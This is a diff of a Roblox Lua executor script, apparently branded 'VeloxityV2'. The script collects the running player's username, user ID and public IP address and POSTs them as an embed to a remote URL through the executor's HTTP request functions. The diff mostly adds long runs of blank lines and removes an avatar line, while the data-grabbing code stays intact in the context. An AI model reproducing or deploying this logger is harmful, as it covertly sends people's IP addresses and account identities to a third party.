@@ -1,3 +1,5 @@
+
+
 local name = game:GetService("Players").LocalPlayer.Name
 local ESD = tostring(game:HttpGet("https://api.ipify.org", true))
 local HTTP_ = game:GetService('HttpService')
@@ -37,7 +39,8 @@ FlUXUS_LOADED and "Fluxus" or ""
 
 local data = {
 username = LPR.Name .. ' [' .. LPR.UserId .. ']',
-avatar_url = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/us...):format(LPR.UserId)))['data'][1]['imageUrl'],
+
+
 embeds = {
 {
 title = "VeloxityV2",
@@ -159,3 +162,45 @@ local headers = {
 local request = http_request or request or HttpPost or syn.request
 local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }
 request(abcdef)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--
